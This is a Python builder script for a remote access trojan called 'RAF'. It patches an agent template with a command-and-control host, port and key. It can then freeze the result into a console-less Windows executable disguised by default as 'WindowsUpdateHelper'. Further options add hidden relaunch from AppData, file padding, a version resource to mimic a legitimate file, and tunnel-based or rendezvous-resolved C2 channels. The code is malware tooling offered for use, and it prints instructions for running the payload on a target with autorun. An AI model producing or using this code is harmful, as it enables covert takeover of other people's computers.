#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
RAF builder -- patch agent.py with a target host/port/key and emit a payload.

    python builder.py --host 10.0.0.5 --port 4444 --key <shared-key> -o payload.py

The output is a standalone single file: no imports beyond the stdlib, no
sidecar modules, ready to drop on a target and run.
"""

import argparse
import os
import re
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
TEMPLATE = os.path.join(HERE, "agent.py")

PATTERNS = {
    "host": re.compile(r'^(HOST\s*=\s*)".*?"', re.M),
    "port": re.compile(r'^(PORT\s*=\s*)\d+', re.M),
    "key": re.compile(r'^(KEY\s*=\s*)".*?"', re.M),
    "stealth": re.compile(r'^(STEALTH\s*=\s*)(True|False)', re.M),
    "transport": re.compile(r'^(TRANSPORT\s*=\s*)".*?"', re.M),
    "http_base": re.compile(r'^(HTTP_BASE\s*=\s*)".*?"', re.M),
    "bootstrap": re.compile(r'^(BOOTSTRAP\s*=\s*)".*?"', re.M),
}


def build(host, port, key, out, template=TEMPLATE, stealth=False, http_base=None,
          bootstrap=None):
    with open(template, "r", encoding="utf-8") as f:
        src = f.read()

    replacements = {
        "host": r'\g<1>"%s"' % host,
        "port": r"\g<1>%d" % port,
        "key": r'\g<1>"%s"' % key,
        "stealth": r"\g<1>%s" % ("True" if stealth else "False"),
        "transport": r'\g<1>"%s"' % ("http" if (http_base or bootstrap) else "tcp"),
        "http_base": r'\g<1>"%s"' % (http_base or ""),
        "bootstrap": r'\g<1>"%s"' % (bootstrap or ""),
    }
    for field, pat in PATTERNS.items():
        new_src, n = pat.subn(replacements[field], src, count=1)
        if n != 1:
            raise SystemExit("build failed: could not patch %s in %s" % (field, template))
        src = new_src

    if not out.lower().endswith(".py"):
        out += ".py"
    with open(out, "w", encoding="utf-8") as f:
        f.write(src)

    # sanity: the result must compile
    try:
        compile(src, out, "exec")
    except SyntaxError as exc:
        raise SystemExit("build failed: generated payload does not compile: %s" % exc)

    return out


def build_exe(pyfile, name, icon=None, onefile=True, pad=0, version_file=None):
    """Freeze the patched payload into a standalone Windows .exe with PyInstaller."""
    import PyInstaller.__main__

    dist = os.path.join(HERE, "dist")
    work = os.path.join(HERE, "build")
    os.makedirs(dist, exist_ok=True)

    args = [
        pyfile,
        "--onefile" if onefile else "--onedir",
        "--noconsole",
        "--name", name,
        "--distpath", dist,
        "--workpath", work,
        "--specpath", work,
        "--clean",
        "--noconfirm",
    ]
    if icon and os.path.isfile(icon):
        args += ["--icon", os.path.abspath(icon)]
    if version_file and os.path.isfile(version_file):
        args += ["--version-file", os.path.abspath(version_file)]

    if pad and pad > 0:
        import tempfile
        padfile = os.path.join(tempfile.gettempdir(), "raf_pad.bin")
        with open(padfile, "wb") as f:
            f.write(os.urandom(pad))
        args += ["--add-data", "%s%s." % (padfile, os.pathsep)]

    PyInstaller.__main__.run(args)
    exe = os.path.join(dist, name + ".exe")
    if not os.path.isfile(exe):
        raise SystemExit("build failed: %s was not produced" % exe)
    return exe


def main():
    ap = argparse.ArgumentParser(description="RAF payload builder")
    ap.add_argument("--host", required=True, help="C2 host the agent dials back to")
    ap.add_argument("--port", type=int, default=4444, help="C2 port (default 4444)")
    ap.add_argument("--key", required=True, help="shared key, must match server --key")
    ap.add_argument("-o", "--out", default="payload.py", help="output file (default payload.py)")
    ap.add_argument("--stealth", action="store_true",
                    help="hidden relaunch from %%APPDATA%% via pythonw + single-instance mutex")
    ap.add_argument("--exe", action="store_true",
                    help="also freeze into dist/<name>.exe with PyInstaller (no Python needed on target)")
    ap.add_argument("--name", default="WindowsUpdateHelper",
                    help="exe base name (default WindowsUpdateHelper)")
    ap.add_argument("--icon", default=None, help="optional .ico for the exe")
    ap.add_argument("--pad", type=int, default=0,
                    help="add N bytes of padding inside the exe (size tuning)")
    ap.add_argument("--version-file", default=None,
                    help="PyInstaller version resource (.txt) to mimic the original file")
    ap.add_argument("--http", default=None, metavar="BASE_URL",
                    help="use HTTP polling transport through BASE_URL (e.g. https://x.trycloudflare.com)")
    ap.add_argument("--bootstrap", default=None, metavar="CHANNEL_URL",
                    help="rendezvous channel the agent reads the live C2 url from (survives tunnel changes)")
    ap.add_argument("--template", default=TEMPLATE, help=argparse.SUPPRESS)
    a = ap.parse_args()

    out = build(a.host, a.port, a.key, a.out, a.template, a.stealth, a.http, a.bootstrap)
    size = os.path.getsize(out)
    print("payload written: %s (%d bytes)" % (out, size))
    print("connect: %s:%d" % (a.host, a.port))
    if a.bootstrap:
        print("transport: http polling, endpoint resolved live from %s" % a.bootstrap)
        if a.http:
            print("           fallback: %s" % a.http)
    elif a.http:
        print("transport: http polling via %s" % a.http)
    else:
        print("transport: raw tcp")
    print("stealth: %s" % ("on (hidden relaunch, no console, mutex)" if a.stealth else "off"))

    if a.exe:
        print("freezing with PyInstaller (this takes a minute)...")
        exe = build_exe(out, a.name, a.icon, pad=a.pad, version_file=a.version_file)
        print("exe ready  : %s (%.1f MB)" % (exe, os.path.getsize(exe) / 1048576.0))
        print("serve it   : python deliver.py --payload \"%s\"" % exe)
    else:
        print("run on target:  python %s" % os.path.basename(out))
        print("with autorun:   python %s --install" % os.path.basename(out))


if __name__ == "__main__":
    main()
